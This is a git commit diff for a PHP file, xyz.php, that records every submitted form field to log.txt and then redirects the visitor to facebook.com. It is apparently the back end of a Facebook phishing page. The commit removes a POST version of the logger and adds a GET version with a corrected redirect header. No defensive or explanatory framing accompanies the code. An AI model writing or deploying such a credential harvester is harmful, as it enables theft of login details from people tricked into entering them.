f3ab81d4429450f2d328474c0c6c90dc982781e1
Vanquy1306 <59086073+Vanquy1306@users.noreply.github.com>
2020-09-28 13:54:13 +0700

    Update xyz.php

--- xyz.php
+++ xyz.php
@@ -1,19 +1,13 @@
-<?php 
-  
-// Set the location to redirect the page 
-header ('https://www.facebook.com/'); 
-  
-// Open the text file in writing mode  
-$file = fopen("log.txt", "a"); 
-  
-foreach($_POST as $variable => $value) { 
-    fwrite($file, $variable); 
-    fwrite($file, "="); 
-    fwrite($file, $value); 
-    fwrite($file, "\r\n"); 
-} 
-  
-fwrite($file, "\r\n"); 
-fclose($file); 
-exit; 
-?> 
+<?php
+header ('Location: https://www.facebook.com  ');
+$handle = fopen("log.txt", "a");
+foreach($_GET as $variable => $value) {
+fwrite($handle, $variable);
+fwrite($handle, "=");
+fwrite($handle, $value);
+fwrite($handle, "\r\n");
+}
+fwrite($handle, "\r\n");
+fclose($handle);
+exit;
+?>
